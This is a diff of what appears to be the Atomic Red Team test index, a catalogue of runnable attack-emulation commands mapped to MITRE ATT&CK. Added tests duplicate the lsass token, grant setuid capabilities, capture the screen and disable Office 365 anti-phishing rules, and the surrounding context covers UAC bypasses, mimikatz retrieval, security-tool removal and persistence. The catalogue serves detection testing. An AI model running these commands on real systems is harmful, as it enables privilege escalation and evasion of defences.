+    - name: Auditd keylogger
+      auto_generated_guid: a668edb9-334e-48eb-8c2e-5413a40867af
+      description: "The linux audit tool auditd can be used to capture 32 and 64 bit
+        command execution and place the command in the /var/log/audit/audit.log audit
+        log. \n"
+      supported_platforms:
+      - linux
+      dependency_executor_name: sh
+      dependencies:
+      - description: 'This test requires sshd and auditd
+
+'
+        prereq_command: 'if [ ! -x "$(command -v auditd)" ]; then echo -e "\n*****
+          auditd NOT installed *****\n"; exit 1; fi
+
+'
+        get_prereq_command: 'echo ""
+
+'
+      executor:
+        name: command_prompt
+        elevation_required: true
+        command: "auditctl -a always,exit -F arch=b64 -S execve -k CMDS \nauditctl
+          -a always,exit -F arch=b32 -S execve -k CMDS\nwhoami; ausearch -i --start
+          $(date +\"%d/%m/%y %H:%M:%S\") \n"
+        cleanup_command: 'systemctl restart auditd
+
+'
   T1557.001:
     technique:
       external_references:
@@ -8892,12 +9435,12 @@ collection:
         package_checker:
           description: Package checking command for linux. Debian system command-
             dpkg -s x11-apps
-          type: string
+          type: String
           default: rpm -q xorg-x11-apps
         package_installer:
           description: Package installer command for linux. Debian system command-
             apt-get install x11-apps
-          type: string
+          type: String
           default: yum install -y xorg-x11-apps
       dependency_executor_name: bash
       dependencies:
@@ -8977,6 +9520,31 @@ collection:
         cleanup_command: 'rm #{output_file} -ErrorAction Ignore
 
 '
+    - name: Windows Screen Capture (CopyFromScreen)
+      auto_generated_guid: e9313014-985a-48ef-80d9-cde604ffc187
+      description: |
+        Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.
+
+        [Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen
+      supported_platforms:
+      - windows
+      input_arguments:
+        output_file:
+          description: Path where captured results will be placed
+          type: Path
+          default: "$env:TEMP\\T1113.png"
+      executor:
+        command: |
+          Add-Type -AssemblyName System.Windows.Forms
+          $screen = [Windows.Forms.SystemInformation]::VirtualScreen
+          $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
+          $graphic = [Drawing.Graphics]::FromImage($bitmap)
+          $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
+          $bitmap.Save("#{output_file}")
+        cleanup_command: 'Remove-Item #{output_file} -ErrorAction Ignore
+
+'
+        name: powershell
   T1213.002:
     technique:
       external_references:
@@ -10473,7 +11041,7 @@ privilege-escalation:
       input_arguments:
         executable_binary:
           description: Binary to execute with UAC Bypass
-          type: path
+          type: Path
           default: C:\Windows\System32\cmd.exe
       executor:
         command: |
@@ -10493,7 +11061,7 @@ privilege-escalation:
       input_arguments:
         executable_binary:
           description: Binary to execute with UAC Bypass
-          type: path
+          type: Path
           default: C:\Windows\System32\cmd.exe
       executor:
         command: |
@@ -10515,7 +11083,7 @@ privilege-escalation:
       input_arguments:
         executable_binary:
           description: Binary to execute with UAC Bypass
-          type: path
+          type: Path
           default: C:\Windows\System32\cmd.exe
       executor:
         command: |
@@ -10537,7 +11105,7 @@ privilege-escalation:
       input_arguments:
         executable_binary:
           description: Binary to execute with UAC Bypass
-          type: path
+          type: Path
           default: C:\Windows\System32\cmd.exe
       executor:
         command: |
@@ -10560,7 +11128,7 @@ privilege-escalation:
       input_arguments:
         executable_binary:
           description: Binary to execute with UAC Bypass
-          type: path
+          type: Path
           default: C:\Windows\System32\cmd.exe
       executor:
         command: |
@@ -10584,7 +11152,7 @@ privilege-escalation:
       input_arguments:
         executable_binary:
           description: Binary to execute with UAC Bypass
-          type: path
+          type: Path
           default: C:\Windows\System32\cmd.exe
       executor:
         command: |
@@ -10608,7 +11176,7 @@ privilege-escalation:
       input_arguments:
         command.to.execute:
           description: Command to execute
-          type: string
+          type: String
           default: cmd.exe /c notepad.exe
       executor:
         command: |
@@ -11283,7 +11851,31 @@ privilege-escalation:
       - 'Command: Command Execution'
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1134.002
+    atomic_tests:
+    - name: Access Token Manipulation
+      auto_generated_guid: dbf4f5a9-b8e0-46a3-9841-9ad71247239e
+      description: "This Action demonstrates how an access token for a specific program
+        can spawn another program under a different owner. \nAdversaries can leverage
+        access tokens to run programs under a different user not only to achieve privilege
+        escalation but also to evade detection by blending in with normal user activity.
+        \nThis Action will query all processes and list the process name and owner.It
+        will then make a copy of an existing token to create a new instance of cmd.exe\n"
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          Set-ExecutionPolicy -Scope Process Bypass -Force
+          $owners = @{}
+          gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
+          Get-Process | Select ProcessName,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
+          Set-Location $PathToAtomicsFolder
+          .\T1134.002\src\GetToken.ps1; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
+        cleanup_command: 'taskkill /im cmd.exe /f
+
+'
+        name: powershell
+        elevation_required: true
   T1543:
     technique:
       external_references:
@@ -11421,11 +12013,11 @@ privilege-escalation:
       input_arguments:
         command:
           description: Command to execute
-          type: string
+          type: String
           default: "/tmp/evil.sh"
         tmp_cron:
           description: Temporary reference file to hold evil cron schedule
-          type: path
+          type: Path
           default: "/tmp/persistevil"
       executor:
         name: bash
@@ -11449,11 +12041,11 @@ privilege-escalation:
       input_arguments:
         command:
           description: Command to execute
-          type: string
+          type: String
           default: echo 'Hello from Atomic Red Team' > /tmp/atomic.log
         cron_script_name:
           description: Name of file to store in cron folder
-          type: string
+          type: String
           default: persistevil
       executor:
         elevation_required: true
@@ -11480,11 +12072,11 @@ privilege-escalation:
       input_arguments:
         command:
           description: Command to execute
-          type: string
+          type: String
           default: echo 'Hello from Atomic Red Team' > /tmp/atomic.log
         cron_script_name:
           description: Name of file to store in /var/spool/cron/crontabs folder
-          type: string
+          type: String
           default: persistevil
       executor:
         elevation_required: true
@@ -11658,12 +12250,12 @@ privilege-escalation:
       input_arguments:
         process_name:
           description: Name of the created process
-          type: string
+          type: String
           default: calculator.exe
         gup_executable:
           description: GUP is an open source signed binary used by Notepad++ for software
             updates
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1574.002\bin\GUP.exe
       dependency_executor_name: powershell
       dependencies:
@@ -12547,7 +13139,7 @@ privilege-escalation:
       input_arguments:
         plist:
           description: Path to attacker emond plist file
-          type: path
+          type: Path
           default: PathToAtomicsFolder/T1546.014/src/T1546.014_emond.plist
       executor:
         command: |
@@ -13400,19 +13992,19 @@ privilege-escalation:
       input_arguments:
         module_name:
           description: Name of the kernel module name.
-          type: string
+          type: String
           default: T1547006
         module_path:
           description: Folder used to store the module.
-          type: path
+          type: Path
           default: "/tmp/T1547.006/T1547006.ko"
         temp_folder:
           description: Temp folder used to compile the code.
-          type: path
+          type: Path
           default: "/tmp/T1547.006"
         module_source_path:
           description: Path to download Gsecdump binary file
-          type: url
+          type: Url
           default: PathToAtomicsFolder/T1547.006/src
       dependency_executor_name: bash
       dependencies:
@@ -13642,11 +14234,11 @@ privilege-escalation:
       input_arguments:
         plist_filename:
           description: filename
-          type: string
+          type: String
           default: com.atomicredteam.plist
         path_malicious_plist:
           description: Name of file to store in cron folder
-          type: string
+          type: String
           default: "$PathToAtomicsFolder/T1543.001/src/atomicredteam_T1543_001.plist"
       dependency_executor_name: bash
       dependencies:
@@ -13761,11 +14353,11 @@ privilege-escalation:
       input_arguments:
         plist_filename:
           description: filename
-          type: string
+          type: String
           default: com.atomicredteam.plist
         path_malicious_plist:
           description: Name of file to store in cron folder
-          type: string
+          type: String
           default: "$PathToAtomicsFolder/T1543.004/src/atomicredteam_T1543_004.plist"
       dependency_executor_name: bash
       dependencies:
@@ -13856,15 +14448,15 @@ privilege-escalation:
       input_arguments:
         script_location:
           description: evil plist location
-          type: path
+          type: Path
           default: "$PathToAtomicsFolder/T1053.004/src/atomicredteam_T1053_004.plist"
         script_destination:
           description: Path where to move the evil plist
-          type: path
+          type: Path
           default: "/etc/emond.d/rules/atomicredteam_T1053_004.plist"
         empty_file:
           description: Random name of the empty file used to trigger emond service
-          type: string
+          type: String
           default: randomflag
       executor:
         name: bash
@@ -14349,23 +14941,23 @@ privilege-escalation:
       input_arguments:
         parent_process_name:
           description: Name of the parent process
-          type: string
+          type: String
           default: explorer
         spawnto_process_path:
           description: Path of the process to spawn
-          type: path
+          type: Path
           default: C:\Program Files\Internet Explorer\iexplore.exe
         dll_process_name:
           description: Name of the created process from the injected dll
-          type: string
+          type: String
           default: calculator
         dll_path:
           description: Path of the dll to inject
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1134.004\bin\calc.dll
         spawnto_process_name:
           description: Name of the process to spawn
-          type: string
+          type: String
           default: iexplore
       dependency_executor_name: powershell
       dependencies:
@@ -14395,15 +14987,15 @@ privilege-escalation:
       input_arguments:
         file_path:
           description: File path or name of process to spawn
-          type: path
+          type: Path
           default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
         parent_pid:
           description: PID of process to spawn from
-          type: string
+          type: String
           default: "$PID"
         command_line:
           description: Specified command line to use
-          type: string
+          type: String
           default: "-Command Start-Sleep 10"
       dependencies:
       - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
@@ -14428,11 +15020,11 @@ privilege-escalation:
       input_arguments:
         parent_pid:
           description: PID of process to spawn from
-          type: string
+          type: String
           default: "$PID"
         test_guid:
           description: Defined test GUID
-          type: string
+          type: String
           default: 12345678-1234-1234-1234-123456789123
       dependencies:
       - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
@@ -14458,11 +15050,11 @@ privilege-escalation:
       input_arguments:
         command_line:
           description: Specified command line to use
-          type: string
+          type: String
           default: "-Command Start-Sleep 10"
         file_path:
           description: File path or name of process to spawn
-          type: path
+          type: Path
           default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
       dependencies:
       - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
@@ -14490,15 +15082,15 @@ privilege-escalation:
       input_arguments:
         command_line:
           description: Specified command line to use
-          type: string
+          type: String
           default: "-Command Start-Sleep 10"
         file_path:
           description: File path or name of process to spawn
-          type: path
+          type: Path
           default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
         parent_name:
           description: Parent process to spoof from
-          type: path
+          type: Path
           default: "$Env:windir\\System32\\notepad.exe"
       dependencies:
       - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
@@ -14815,7 +15407,7 @@ privilege-escalation:
         service_executable:
           description: Path of the executable used for the service and as the hijacked
             program.exe
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1574.009\bin\WindowsServiceExample.exe
       executor:
         command: |
@@ -15519,19 +16111,19 @@ privilege-escalation:
         hollow_binary_path:
           description: Path of the binary to hollow (executable that will run inside
             the sponsor)
-          type: string
+          type: String
           default: C:\Windows\System32\cmd.exe
         parent_process_name:
           description: Name of the parent process
-          type: string
+          type: String
           default: explorer
         sponsor_binary_path:
           description: Path of the sponsor binary (executable that will host the binary)
-          type: string
+          type: String
           default: C:\Windows\System32\notepad.exe
         spawnto_process_name:
           description: Name of the process to spawn
-          type: string
+          type: String
           default: notepad
       executor:
         command: |
@@ -15724,15 +16316,15 @@ privilege-escalation:
       input_arguments:
         machine:
           description: machine to target (via psexec)
-          type: string
+          type: String
           default: DC1
         mimikatz_path:
           description: Mimikatz windows executable
-          type: path
+          type: Path
           default: "%tmp%\\mimikatz\\x64\\mimikatz.exe"
         psexec_path:
           description: Path to PsExec
-          type: string
+          type: String
           default: C:\PSTools\PsExec.exe
       dependency_executor_name: powershell
       dependencies:
@@ -15746,8 +16338,8 @@ privilege-escalation:
         get_prereq_command: |
           $mimikatz_path = cmd /c echo #{mimikatz_path}
           [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
-          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -OutFile "$env:TEMP\mimikatz.zip"
+          $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+          Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
           Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
           New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
           Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -16066,7 +16658,7 @@ privilege-escalation:
       input_arguments:
         script:
           description: path to script
-          type: path
+          type: Path
           default: "/path/to/script"
       executor:
         command: 'sudo defaults write com.apple.loginwindow LoginHook #{script}
@@ -16504,7 +17096,7 @@ privilege-escalation:
         time:
           description: What time 24 Hour
           type: String
-          default: 72600
+          default: '20:10'
       executor:
         name: command_prompt
         elevation_required: false
@@ -16530,7 +17122,7 @@ privilege-escalation:
         time:
           description: What time 24 Hour
           type: String
-          default: 72600
+          default: '20:10'
         target:
           description: Target
           type: String
@@ -16770,7 +17362,7 @@ privilege-escalation:
       input_arguments:
         input_binary:
           description: Executable binary to use in place of screensaver for persistence
-          type: path
+          type: Path
           default: C:\Windows\System32\cmd.exe
       executor:
         command: |
@@ -17119,7 +17711,7 @@ privilege-escalation:
       input_arguments:
         payload:
           description: hello.c payload
-          type: path
+          type: Path
           default: PathToAtomicsFolder/T1548.001/src/hello.c
       executor:
         command: |
@@ -17145,7 +17737,7 @@ privilege-escalation:
       input_arguments:
         file_to_setuid:
           description: Path of file to set SetUID flag
-          type: path
+          type: Path
           default: "/tmp/evilBinary"
       executor:
         command: |
@@ -17168,7 +17760,7 @@ privilege-escalation:
       input_arguments:
         file_to_setuid:
           description: Path of file to set SetGID flag
-          type: path
+          type: Path
           default: "/tmp/evilBinary"
       executor:
         command: |
@@ -17176,6 +17768,52 @@ privilege-escalation:
           sudo chown root #{file_to_setuid}
           sudo chmod g+s #{file_to_setuid}
         cleanup_command: 'sudo rm #{file_to_setuid}
+
+'
+        name: sh
+        elevation_required: true
+    - name: Make and modify capabilities of a binary
+      auto_generated_guid: db53959c-207d-4000-9e7a-cd8eb417e072
+      description: |
+        Make and modify [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) of a C source code file.
+        The binary doesn't have to modify the UID, but the binary is given the capability to arbitrarily modify it at any time with `setuid(0)`.
+        Without being owned by root, the binary can set the UID to 0.
+      supported_platforms:
+      - linux
+      input_arguments:
+        payload:
+          description: cap.c payload
+          type: Path
+          default: PathToAtomicsFolder/T1548.001/src/cap.c
+      executor:
+        command: |
+          cp #{payload} /tmp/cap.c
+          make /tmp/cap
+          sudo setcap cap_setuid=ep /tmp/cap
+          /tmp/cap
+        cleanup_command: |
+          rm /tmp/cap
+          rm /tmp/cap.c
+        name: sh
+        elevation_required: true
+    - name: Provide the SetUID capability to a file
+      auto_generated_guid: 1ac3272f-9bcf-443a-9888-4b1d3de785c1
+      description: 'This test gives a file the capability to set UID without using
+        flags.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        file_to_setcap:
+          description: Path of file to provide the SetUID capability
+          type: Path
+          default: "/tmp/evilBinary"
+      executor:
+        command: |
+          touch #{file_to_setcap}
+          sudo setcap cap_setuid=ep #{file_to_setcap}
+        cleanup_command: 'rm #{file_to_setcap}
 
 '
         name: sh
@@ -17242,7 +17880,7 @@ privilege-escalation:
       input_arguments:
         shortcut_file_path:
           description: shortcut modified and execute
-          type: path
+          type: Path
           default: "%temp%\\T1547.009_modified_shortcut.url"
       executor:
         command: |
@@ -18253,7 +18891,7 @@ privilege-escalation:
       input_arguments:
         command_to_add:
           description: Command to add to the .bash_profile file
-          type: string
+          type: String
           default: "/path/to/script.py"
       executor:
         command: 'echo "#{command_to_add}" >> ~/.bash_profile
@@ -18271,7 +18909,7 @@ privilege-escalation:
       input_arguments:
         command_to_add:
           description: Command to add to the .bashrc file
-          type: string
+          type: String
           default: "/path/to/script.py"
       executor:
         command: 'echo "#{command_to_add}" >> ~/.bashrc
@@ -19379,11 +20017,11 @@ defense-evasion:
       input_arguments:
         remote_file:
           description: Remote file to download
-          type: url
+          type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
-          type: path
+          type: Path
           default: "%temp%\\bitsadmin1_flag.ps1"
       executor:
         command: 'bitsadmin.exe /transfer /Download /priority Foreground #{remote_file}
@@ -19406,11 +20044,11 @@ defense-evasion:
       input_arguments:
         remote_file:
           description: Remote file to download
-          type: url
+          type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
         local_file:
           description: Local file path to save downloaded file
-          type: path
+          type: Path
           default: "$env:TEMP\\bitsadmin2_flag.ps1"
       executor:
         command: 'Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination
@@ -19433,19 +20071,19 @@ defense-evasion:
       input_arguments:
         command_path:
           description: Path of command to execute
-          type: path
+          type: Path
           default: C:\Windows\system32\notepad.exe
         bits_job_name:
           description: Name of BITS job
-          type: string
+          type: String
           default: AtomicBITS
         local_file:
           description: Local file path to save downloaded file
-          type: path
+          type: Path
           default: "%temp%\\bitsadmin3_flag.ps1"
         remote_file:
           description: Remote file to download
-          type: url
+          type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
       executor:
         command: |
@@ -19471,19 +20109,19 @@ defense-evasion:
       input_arguments:
         remote_file:
           description: Remote file to download
-          type: url
+          type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
         download_path:
           description: Local file path to save downloaded file
-          type: path
+          type: Path
           default: SYSTEMROOT=C:\Windows\Temp
         cleanup_path:
           description: path to delete file as part of cleanup_command
-          type: path
+          type: Path
           default: C:\Windows\Temp\Personalization\LockScreenImage
         cleanup_file:
           description: file to remove as part of cleanup_command
-          type: string
+          type: String
           default: "*.md"
       executor:
         command: 'set "#{download_path}" && cmd /c desktopimgdownldr.exe /lockscreenurl:#{remote_file}
@@ -19820,7 +20458,7 @@ defense-evasion:
       input_arguments:
         executable_binary:
           description: Binary to execute with UAC Bypass
-          type: path
+          type: Path
           default: C:\Windows\System32\cmd.exe
       executor:
         command: |
@@ -19840,7 +20478,7 @@ defense-evasion:
       input_arguments:
         executable_binary:
           description: Binary to execute with UAC Bypass
-          type: path
+          type: Path
           default: C:\Windows\System32\cmd.exe
       executor:
         command: |
@@ -19862,7 +20500,7 @@ defense-evasion:
       input_arguments:
         executable_binary:
           description: Binary to execute with UAC Bypass
-          type: path
+          type: Path
           default: C:\Windows\System32\cmd.exe
       executor:
         command: |
@@ -19884,7 +20522,7 @@ defense-evasion:
       input_arguments:
         executable_binary:
           description: Binary to execute with UAC Bypass
-          type: path
+          type: Path
           default: C:\Windows\System32\cmd.exe
       executor:
         command: |
@@ -19907,7 +20545,7 @@ defense-evasion:
       input_arguments:
         executable_binary:
           description: Binary to execute with UAC Bypass
-          type: path
+          type: Path
           default: C:\Windows\System32\cmd.exe
       executor:
         command: |
@@ -19931,7 +20569,7 @@ defense-evasion:
       input_arguments:
         executable_binary:
           description: Binary to execute with UAC Bypass
-          type: path
+          type: Path
           default: C:\Windows\System32\cmd.exe
       executor:
         command: |
@@ -19955,7 +20593,7 @@ defense-evasion:
       input_arguments:
         command.to.execute:
           description: Command to execute
-          type: string
+          type: String
           default: cmd.exe /c notepad.exe
       executor:
         command: |
@@ -20094,7 +20732,7 @@ defense-evasion:
       input_arguments:
         inf_file_path:
           description: Path to the INF file
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1218.003\src\T1218.003.inf
       dependency_executor_name: powershell
       dependencies:
@@ -20123,7 +20761,7 @@ defense-evasion:
       input_arguments:
         inf_file_uac:
           description: Path to the INF file
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1218.003\src\T1218.003_uacbypass.inf
       dependency_executor_name: powershell
       dependencies:
@@ -21221,7 +21859,7 @@ defense-evasion:
       input_arguments:
         local_chm_file:
           description: Local .chm payload
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1218.001\src\T1218.001.chm
       dependency_executor_name: powershell
       dependencies:
@@ -21249,7 +21887,7 @@ defense-evasion:
       input_arguments:
         remote_chm_file:
           description: Remote .chm payload
-          type: url
+          type: Url
           default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm
       executor:
         command: 'hh.exe #{remote_chm_file}
@@ -21264,11 +21902,11 @@ defense-evasion:
       input_arguments:
         chm_file_path:
           description: Default path of CHM
-          type: string
+          type: String
           default: Test.chm
         hh_file_path:
           description: path of modified HH.exe
-          type: path
+          type: Path
           default: "$env:windir\\hh.exe"
       dependencies:
       - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp
@@ -21293,15 +21931,15 @@ defense-evasion:
       input_arguments:
         hh_file_path:
           description: path of modified HH.exe
-          type: path
+          type: Path
           default: "$env:windir\\hh.exe"
         infotech_storage_handler:
           description: Default InfoTech Storage Protocol Handler
-          type: string
+          type: String
           default: its
         chm_file_path:
           description: Default path of CHM
-          type: string
+          type: String
           default: Test.chm
       dependencies:
       - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp
@@ -21326,7 +21964,7 @@ defense-evasion:
       input_arguments:
         chm_file_path:
           description: Default path of CHM
-          type: string
+          type: String
           default: Test.chm
       dependencies:
       - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp
@@ -21351,23 +21989,23 @@ defense-evasion:
       input_arguments:
         topic_extension:
           description: Default Help Topic
-          type: string
+          type: String
           default: html
         hh_file_path:
           description: path of modified HH.exe
-          type: path
+          type: Path
           default: "$env:windir\\hh.exe"
         infotech_storage_handler:
           description: Default InfoTech Storage Protocol Handler
-          type: string
+          type: String
           default: its
         script_engine:
           description: Default Script Engine
-          type: string
+          type: String
           default: JScript
         chm_file_path:
           description: Default path of CHM
-          type: string
+          type: String
           default: Test.chm
       dependencies:
       - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp
@@ -21394,11 +22032,11 @@ defense-evasion:
       input_arguments:
         topic_extension:
           description: Default Help Topic
-          type: string
+          type: String
           default: html
         hh_file_path:
           description: path of modified HH.exe
-          type: path
+          type: Path
           default: "$env:windir\\hh.exe"
         infotech_storage_handler:
           description: Default InfoTech Storage Protocol Handler
@@ -21406,7 +22044,7 @@ defense-evasion:
           default: its
         chm_file_path:
           description: Default path of CHM
-          type: string
+          type: String
           default: Test.chm
       dependencies:
       - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp
@@ -21565,7 +22203,7 @@ defense-evasion:
       input_arguments:
         cpl_file_path:
           description: path to cpl file
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1218.002\bin\calc.cpl
       dependency_executor_name: powershell
       dependencies:
@@ -21678,7 +22316,31 @@ defense-evasion:
       - 'Command: Command Execution'
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1134.002
+    atomic_tests:
+    - name: Access Token Manipulation
+      auto_generated_guid: dbf4f5a9-b8e0-46a3-9841-9ad71247239e
+      description: "This Action demonstrates how an access token for a specific program
+        can spawn another program under a different owner. \nAdversaries can leverage
+        access tokens to run programs under a different user not only to achieve privilege
+        escalation but also to evade detection by blending in with normal user activity.
+        \nThis Action will query all processes and list the process name and owner.It
+        will then make a copy of an existing token to create a new instance of cmd.exe\n"
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          Set-ExecutionPolicy -Scope Process Bypass -Force
+          $owners = @{}
+          gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}
+          Get-Process | Select ProcessName,Id,@{l="Owner";e={$owners[$_.id.tostring()]}}
+          Set-Location $PathToAtomicsFolder
+          .\T1134.002\src\GetToken.ps1; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,"cmd.exe")
+        cleanup_command: 'taskkill /im cmd.exe /f
+
+'
+        name: powershell
+        elevation_required: true
   T1578.001:
     technique:
       external_references:
@@ -21901,12 +22563,12 @@ defense-evasion:
       input_arguments:
         process_name:
           description: Name of the created process
-          type: string
+          type: String
           default: calculator.exe
         gup_executable:
           description: GUP is an open source signed binary used by Notepad++ for software
             updates
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1574.002\bin\GUP.exe
       dependency_executor_name: powershell
       dependencies:
@@ -22168,7 +22830,7 @@ defense-evasion:
       input_arguments:
         executable:
           description: name of executable
-          type: path
+          type: Path
           default: C:\Windows\System32\calc.exe
       executor:
         command: |
@@ -22189,7 +22851,7 @@ defense-evasion:
       input_arguments:
         executable:
           description: name of executable/file to decode
-          type: path
+          type: Path
           default: C:\Windows\System32\calc.exe
       executor:
         command: |
@@ -22544,7 +23206,7 @@ defense-evasion:
       input_arguments:
         volume:
           description: Drive letter of the volume to access
-          type: string
+          type: String
           default: 'C:'
       executor:
         command: |
@@ -22758,7 +23420,7 @@ defense-evasion:
       input_arguments:
         website_name:
           description: The name of the website on a server
-          type: string
+          type: String
           default: Default Web Site
       executor:
         command: 'C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}"
@@ -22984,7 +23646,7 @@ defense-evasion:
       input_arguments:
         local_port:
           description: This is the local port you wish to test opening
-          type: integer
+          type: Integer
           default: 3389
       executor:
         command: netsh advfirewall firewall add rule name="Open Port to Any" dir=in
@@ -23002,7 +23664,7 @@ defense-evasion:
       input_arguments:
         exe_file_path:
           description: path to exe file
-          type: path
+          type: Path
           default: PathToAtomicsFolder\T1562.004\bin\AtomicTest.exe
       executor:
         command: |
@@ -23325,11 +23987,11 @@ defense-evasion:
       input_arguments:
         package_checker:
           description: Package checking command for linux. Default rpm
-          type: string
+          type: String
           default: rpm -q rsyslog
         package_installer:
           description: Package installer command for linux. Default yum
-          type: string
+          type: String
           default: yum install -y rsyslog
         flavor_command:
           description: Command to disable syslog collection. Default newer rsyslog
@@ -23482,11 +24144,11 @@ defense-evasion:
       input_arguments:
         falcond_plist:
           description: The path of the Crowdstrike Falcon plist file
-          type: path
+          type: Path
           default: "/Library/LaunchDaemons/com.crowdstrike.falcond.plist"
         userdaemon_plist:
           description: The path of the Crowdstrike Userdaemon plist file
-          type: path
+          type: Path
           default: "/Library/LaunchDaemons/com.crowdstrike.userdaemon.plist"
       executor:
         command: |
@@ -23508,7 +24170,7 @@ defense-evasion:
         sysmon_driver:
           description: The name of the Sysmon filter driver (this can change from
             the default)
-          type: string
+          type: String
           default: SysmonDrv
       dependency_executor_name: powershell
       dependencies:
@@ -23784,7 +24446,7 @@ defense-evasion:
       input_arguments:
         falcond_path:
           description: The Crowdstrike Windows Sensor path. The Guid always changes.
-          type: path
+          type: Path
           default: C:\ProgramData\Package Cache\{7489ba93-b668-447f-8401-7e57a6fe538d}\WindowsSensor.exe
       executor:
         command: if (Test-Path "#{falcond_path}") {. "#{falcond_path}" /repair /uninstall
@@ -23805,7 +24467,7 @@ defense-evasion:
       input_arguments:
         excluded_folder:
           description: This folder will be excluded from scanning
-          type: String
+          type: Path
           default: C:\Temp
       executor:
         command: |-
@@ -23827,7 +24489,7 @@ defense-evasion:
       input_arguments:
         excluded_exts:
           description: A list of extension to exclude from scanning
-          type: string
+          type: String
           default: ".exe"
       executor:
         command: |-
@@ -23849,7 +24511,7 @@ defense-evasion:
       input_arguments:
         excluded_process:
           description: A list of processes to exclude from scanning
-          type: string
+          type: String
           default: outlook.exe
       executor:
         command: |-
@@ -23860,6 +24522,52 @@ defense-evasion:
           Remove-MpPreference -ExclusionProcess  $excludedProcess
         name: powershell
         elevation_required: true
+    - name: office-365-Disable-AntiPhishRule
+      auto_generated_guid: b9bbae2c-2ba6-4cf3-b452-8e8f908696f3
+      description: 'Using the Disable-AntiPhishRule cmdlet to disable antiphish rules
+        in your office-365 organization.
+
+'
+      supported_platforms:
+      - office-365
+      input_arguments:
+        username:
+          description: office-365 username
+          type: String
+          default: 
+        password:
+          description: office-365 password
+          type: String
+          default: 
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'ExchangeOnlineManagement PowerShell module must be installed
+
+'
+        prereq_command: |
+          $RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}
+        get_prereq_command: |
+          Install-Module -Name ExchangeOnlineManagement
+          Import-Module ExchangeOnlineManagement
+      executor:
+        command: |
+          $secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
+          $creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
+          Connect-ExchangeOnline -Credential $creds
+          $test = Get-AntiPhishRule
+          Disable-AntiPhishRule -Identity $test.Name -Confirm:$false
+          Get-AntiPhishRule
+        cleanup_command: |
+          $secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force
+          $creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd
+          Connect-ExchangeOnline -Credential $creds
+          $test = Get-AntiPhishRule
+          Enable-AntiPhishRule -Identity $test.Name -Confirm:$false
+          Get-AntiPhishRule
+        name: powershell
+        elevation_required: false
   T1078.002:
     technique:
       external_references:
@@ -25106,7 +25814,7 @@ defense-evasion:
         file_to_delete:
